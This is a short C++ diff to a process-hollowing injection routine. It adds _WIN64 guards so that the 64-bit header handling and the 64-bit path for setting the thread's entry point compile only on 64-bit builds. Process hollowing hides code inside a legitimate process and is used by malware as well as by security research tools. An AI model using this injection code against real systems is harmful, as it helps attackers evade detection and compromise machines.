@@ -46,9 +46,12 @@ bool inject_create_process_hollow(const std::wstring& original_image,
 
     auto *pDOSHeader = (PIMAGE_DOS_HEADER)image_mapping.data;
     auto *pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(image_mapping.data, pDOSHeader->e_lfanew);
+#if defined(_WIN64)
     auto *pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;
-
     bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+#else
+    bool is_64 = false;
+#endif
 
     RemoteProcessMemoryContext ctx;
     ctx.method = method;
@@ -108,12 +111,16 @@ bool inject_create_process_hollow(const std::wstring& original_image,
 
     wprintf(L"\nFixing thread\n");
 
+#if defined(_WIN64)
     if (is_64) {
         res = thread_set_execute<true, true>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint));
     }
     else {
+#endif
         res = thread_set_execute<true, false>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint));
+#if defined(_WIN64)
     }
+#endif
 
     wprintf(L"  [*] resuming thread...\n");
 
